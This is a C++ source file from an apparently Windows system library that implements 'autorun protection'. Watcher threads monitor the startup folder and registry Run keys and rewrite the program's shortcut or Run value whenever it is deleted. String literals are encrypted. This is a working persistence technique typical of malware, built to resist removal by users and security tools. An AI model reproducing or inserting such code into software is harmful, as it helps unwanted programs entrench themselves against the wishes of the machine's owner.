#include "sys_includes.h"

#include "syslib\debug.h"
#include "syslib\mem.h"
#include "syslib\system.h"
#include "syslib\threadsgroup.h"
#include "syslib\str.h"

#include "arun_prot.h"
#include "lnk.h"
#include "reg.h"

#include "syslib\strcrypt.h"
#include "str_crx.h"

static PROTECTED_HIVES *lpHives=NULL;
static DWORD dwInit;

static bool IsInit()
{
    return (dwInit == GetCurrentProcessId());
}

static void Init()
{
    dwInit=GetCurrentProcessId();
    lpHives=NULL;
    return;
}

static HANDLE GetProtectedHive(LPCWSTR lpFile)
{
    HANDLE hProtection=NULL;
    if (lpHives)
    {
        PROTECTED_HIVES *lpHive=lpHives;
        while (lpHive)
        {
            if (!lstrcmpiW(lpHive->lpHive->szProtectedFile,lpFile))
            {
                hProtection=(HANDLE)lpHive->lpHive;
                break;
            }
            lpHive=lpHive->lpNext;
        }
    }
    return hProtection;
}

static DWORD CountProtectedItems(PROTECTED_ITEM *lpItems)
{
    DWORD dwRet=0;
    if (lpItems)
    {
        while (lpItems)
        {
            dwRet++;
            lpItems=lpItems->lpNext;
        }
    }
    return dwRet;
}

static PROTECTED_ITEM *GetItemByIdx(PROTECTED_ITEM *lpItems,DWORD dwIndex)
{
    PROTECTED_ITEM *lpItem=lpItems;
    for (DWORD i=0; i < dwIndex; i++)
    {
        lpItem=lpItem->lpNext;
        if (!lpItem)
            break;
    }
    return lpItem;
}

static void WINAPI LnkWatchThread(PROTECTED_ITEMS_HIVE *lpHive)
{
    DWORD dwCount=CountProtectedItems(lpHive->lpLnkItems);
    if (dwCount)
    {
        HANDLE *lpHandles=(HANDLE*)MemAlloc(sizeof(HANDLE)*dwCount);
        if (lpHandles)
        {
            PROTECTED_ITEM *lpItems=lpHive->lpLnkItems,*lpCurItem=lpItems;
            for (DWORD i=0; i < dwCount; i++)
            {
                lpHandles[i]=FindFirstChangeNotificationW(lpCurItem->szArunDir,false,LNK_WATCHER_FLAGS);
                if (lpHandles[i] == INVALID_HANDLE_VALUE)
                    i--;

                lpCurItem=lpCurItem->lpNext;
            }

            while (WaitForSingleObject(lpHive->hStopEvent,0) == WAIT_TIMEOUT)
            {
                DWORD dwIndex=SysWaitForMultipleObjects(dwCount,lpHandles,FALSE,1);
                if ((dwIndex != WAIT_FAILED) && (dwIndex != WAIT_TIMEOUT))
                {
                    EnterSafeCriticalSection(&lpHive->csProtection);
                    {
                        PROTECTED_ITEM *lpItem=GetItemByIdx(lpItems,dwIndex);
                        if (lpItem)
                        {
                            SYSLIB::ArunLnk_AppendFileToArunDirInt(lpHive->szProtectedFile,lpItem->szArunDir);

                            FindNextChangeNotification(lpHandles[dwIndex]);
                            ResetEvent(lpHandles[dwIndex]);

                            FindNextChangeNotification(lpHandles[dwIndex]);
                        }
                    }
                    LeaveSafeCriticalSection(&lpHive->csProtection);
                }
            }

            for (DWORD i=0; i < dwCount; i++)
                FindCloseChangeNotification(lpHandles[i]);
            MemFree(lpHandles);
        }
    }
    return;
}

static void WINAPI RegWatchThread(PROTECTED_ITEMS_HIVE *lpHive)
{
    DWORD dwCount=CountProtectedItems(lpHive->lpRegItems);
    if (dwCount)
    {
        HANDLE *lpEvents=(HANDLE*)MemAlloc(sizeof(HANDLE)*dwCount);
        if (lpEvents)
        {
            HKEY *lpKeys=(HKEY*)MemAlloc(sizeof(HKEY)*dwCount);
            if (lpKeys)
            {
                PROTECTED_ITEM *lpItems=lpHive->lpRegItems,*lpCurItem=lpItems;
                for (DWORD i=0; i < dwCount; i++)
                {
                    if (RegOpenKeyExW(HKEY_USERS,lpCurItem->szRootKey,NULL,KEY_WOW64_64KEY|KEY_READ|KEY_WRITE,&lpKeys[i]) == ERROR_SUCCESS)
                    {
                        lpEvents[i]=CreateEvent(NULL,true,false,NULL);
                        RegNotifyChangeKeyValue(lpKeys[i],false,REG_WATCHER_FLAGS,lpEvents[i],true);
                    }
                    else
                        i--;

                    lpCurItem=lpCurItem->lpNext;
                }

                WCHAR szFullFileNameWithQuotes[MAX_PATH];
                DWORD dwValueSize=StrFormatW(szFullFileNameWithQuotes,dcrW_d8c58bc3("\"%s\""),lpHive->szProtectedFile);
                dwValueSize*=sizeof(WCHAR);
                while (WaitForSingleObject(lpHive->hStopEvent,0) == WAIT_TIMEOUT)
                {
                    DWORD dwIndex=SysWaitForMultipleObjects(dwCount,lpEvents,FALSE,1);
                    if ((dwIndex != WAIT_FAILED) && (dwIndex != WAIT_TIMEOUT))
                    {
                        EnterSafeCriticalSection(&lpHive->csProtection);
                        {
                            PROTECTED_ITEM *lpItem=GetItemByIdx(lpItems,dwIndex);
                            if (lpItem)
                            {
                                RegSetValueExW(lpKeys[dwIndex],lpItem->szValueName,NULL,REG_SZ,(byte*)szFullFileNameWithQuotes,dwValueSize);
                                RegFlushKey(lpKeys[dwIndex]);

                                RegNotifyChangeKeyValue(lpKeys[dwIndex],false,REG_WATCHER_FLAGS,lpEvents[dwIndex],true);
                                ResetEvent(lpKeys[dwIndex]);

                                RegNotifyChangeKeyValue(lpKeys[dwIndex],false,REG_WATCHER_FLAGS,lpEvents[dwIndex],true);
                            }
                        }
                        LeaveSafeCriticalSection(&lpHive->csProtection);
                    }
                }

                for (DWORD i=0; i < dwCount; i++)
                {
                    RegCloseKey(lpKeys[i]);
                    SysCloseHandle(lpEvents[i]);
                }
                MemFree(lpKeys);
            }
            MemFree(lpEvents);
        }
    }
    return;
}

static void AppendHive(PROTECTED_ITEMS_HIVE *lpHive,LPCWSTR lpFile)
{
    lstrcpyW(lpHive->szProtectedFile,lpFile);
    InitializeSafeCriticalSection(&lpHive->csProtection);
    lpHive->hStopEvent=CreateEvent(NULL,true,false,NULL);
    lpHive->hThreadsGroup=ThreadsGroup_Create();

    PROTECTED_HIVES *lpHiveItem=(PROTECTED_HIVES*)MemAlloc(sizeof(PROTECTED_HIVES));
    lpHiveItem->lpHive=lpHive;
    if (lpHives)
    {
        PROTECTED_HIVES *lpCurHive=lpHives;
        while (lpCurHive->lpNext)
            lpCurHive=lpCurHive->lpNext;
        lpCurHive->lpNext=lpHiveItem;
    }
    else
        lpHives=lpHiveItem;


    ThreadsGroup_CreateThread(lpHive->hThreadsGroup,0,(LPTHREAD_START_ROUTINE)LnkWatchThread,lpHive,NULL,NULL);
    ThreadsGroup_CreateThread(lpHive->hThreadsGroup,0,(LPTHREAD_START_ROUTINE)RegWatchThread,lpHive,NULL,NULL);
    return;
}

SYSLIBFUNC(HANDLE) Arun_ProtectMeW(LPCWSTR lpFile)
{
    if (!SYSLIB_SAFE::CheckStrParamW(lpFile,MAX_PATH))
        return NULL;

    if (!IsInit())
        Init();

    HANDLE hProtection=GetProtectedHive(lpFile);
    if (!hProtection)
    {
        PROTECTED_ITEMS_HIVE *lpHive=(PROTECTED_ITEMS_HIVE *)MemAlloc(sizeof(PROTECTED_ITEMS_HIVE));
        if (lpHive)
        {
            DWORD dwCount=(DWORD)(SYSLIB::ArunLnk_ProtectW(lpFile,lpHive) != false);
            dwCount+=(DWORD)(SYSLIB::ArunReg_ProtectW(lpFile,lpHive) != false);
            if (dwCount)
            {
                AppendHive(lpHive,lpFile);
                hProtection=(HANDLE)lpHive;
            }
            else
                MemFree(lpHive);
        }
    }
    return hProtection;
}

SYSLIBFUNC(HANDLE) Arun_ProtectMeA(LPCSTR lpFile)
{
    LPWSTR lpFileNameW=StrAnsiToUnicodeEx(lpFile,0,NULL);

    HANDLE hProtection=Arun_ProtectMeW(lpFileNameW);

    MemFree(lpFileNameW);
    return hProtection;
}

static bool IsGoodHandle(HANDLE hProtection)
{
    bool bRet=false;
    if (lpHives)
    {
        PROTECTED_HIVES *lpHive=lpHives;
        while (lpHive)
        {
            if (hProtection == (HANDLE)lpHive->lpHive)
            {
                bRet=true;
                break;
            }
            lpHive=lpHive->lpNext;
        }
    }
    return bRet;
}

SYSLIBFUNC(BOOL) Arun_PauseProtection(HANDLE hProtection)
{
    if (!IsInit())
        Init();

    BOOL bRet=false;
    if (IsGoodHandle(hProtection))
    {
        PROTECTED_ITEMS_HIVE *lpHive=(PROTECTED_ITEMS_HIVE *)hProtection;
        EnterSafeCriticalSection(&lpHive->csProtection);
    }
    return bRet;
}

SYSLIBFUNC(BOOL) Arun_ResumeProtection(HANDLE hProtection)
{
    if (!IsInit())
        Init();

    BOOL bRet=false;
    if (IsGoodHandle(hProtection))
    {
        PROTECTED_ITEMS_HIVE *lpHive=(PROTECTED_ITEMS_HIVE *)hProtection;
        LeaveSafeCriticalSection(&lpHive->csProtection);
    }
    return bRet;
}

SYSLIBFUNC(void) Arun_StopProtection(HANDLE hProtection)
{
    if (!IsInit())
        Init();

    if (IsGoodHandle(hProtection))
    {
        PROTECTED_ITEMS_HIVE *lpHive=(PROTECTED_ITEMS_HIVE *)hProtection;
        SetEvent(lpHive->hStopEvent);
        ThreadsGroup_WaitForAllExit(lpHive->hThreadsGroup,INFINITE);

        PROTECTED_ITEM *lpItem=lpHive->lpRegItems;
        while (lpItem)
        {
            PROTECTED_ITEM *lpPrevItem=lpItem;
            lpItem=lpItem->lpNext;
            MemFree(lpPrevItem);
        }

        lpItem=lpHive->lpLnkItems;
        while (lpItem)
        {
            PROTECTED_ITEM *lpPrevItem=lpItem;
            lpItem=lpItem->lpNext;
            MemFree(lpPrevItem);
        }

        DeleteSafeCriticalSection(&lpHive->csProtection);
        MemFree(lpHive);

        PROTECTED_HIVES *lpCurHive=lpHives,*lpPrevHive=NULL;
        while (lpCurHive)
        {
            if (lpCurHive->lpHive == lpHive)
            {
                if (lpPrevHive)
                    lpPrevHive->lpNext=lpCurHive->lpNext;
                else
                    lpHives=lpCurHive->lpNext;
                MemFree(lpCurHive);
                break;
            }
            lpPrevHive=lpCurHive;
            lpCurHive=lpCurHive->lpNext;
        }
    }
    return;
}

namespace SYSLIB
{
    bool Arun_AddProtectedItem(PROTECTED_ITEMS_HIVE *lpHive,PROTECTED_ITEM_TYPE dwType,LPCWSTR lpDir,LPCWSTR lpName)
    {
        bool bRet=false;
        PROTECTED_ITEM *lpItem=(PROTECTED_ITEM*)MemAlloc(sizeof(PROTECTED_ITEM));
        if (lpItem)
        {
            lpItem->dwType=dwType;
            lstrcpyW(lpItem->szRootKey,lpDir);
            lstrcpyW(lpItem->szValueName,lpName);
            bRet=true;

            PROTECTED_ITEM **lppItem;
            if (dwType == PROTECTED_LNK)
                lppItem=&lpHive->lpLnkItems;
            else
                lppItem=&lpHive->lpRegItems;

            if (*lppItem)
            {
                PROTECTED_ITEM *lpCurItem=*lppItem;
                while (lpCurItem->lpNext)
                    lpCurItem=lpCurItem->lpNext;
                lpCurItem->lpNext=lpItem;
            }
            else
                *lppItem=lpItem;
        }
        return bRet;
    }
}

SYSLIBFUNC(void) Arun_UnprotectMeW(LPCWSTR lpFile)
{
    if (!IsInit())
        return;

    if (!SYSLIB_SAFE::CheckStrParamW(lpFile,MAX_PATH))
        return;

    HANDLE hProtection=GetProtectedHive(lpFile);
    if (hProtection)
    {
        Arun_PauseProtection(hProtection);
        PROTECTED_ITEMS_HIVE *lpHive=(PROTECTED_ITEMS_HIVE *)hProtection;
        SetEvent(lpHive->hStopEvent);
        Arun_ResumeProtection(hProtection);
        ThreadsGroup_WaitForAllExit(lpHive->hThreadsGroup,INFINITE);

        SYSLIB::ArunLnk_UnprotectW(lpFile,lpHive);
        SYSLIB::ArunReg_UnprotectW(lpFile,lpHive);

        bool bStop=true;
        if (lpHive->lpLnkItems)
        {
            ThreadsGroup_CreateThread(lpHive->hThreadsGroup,0,(LPTHREAD_START_ROUTINE)LnkWatchThread,lpHive,NULL,NULL);
            bStop=false;
        }

        if (lpHive->lpRegItems)
        {
            ThreadsGroup_CreateThread(lpHive->hThreadsGroup,0,(LPTHREAD_START_ROUTINE)RegWatchThread,lpHive,NULL,NULL);
            bStop=false;
        }

        if (bStop)
            Arun_StopProtection(hProtection);
    }
    return;
}

SYSLIBFUNC(void) Arun_UnprotectMeA(LPCSTR lpFile)
{
    LPWSTR lpFileNameW=StrAnsiToUnicodeEx(lpFile,0,NULL);

    Arun_UnprotectMeW(lpFileNameW);

    MemFree(lpFileNameW);
    return;
}

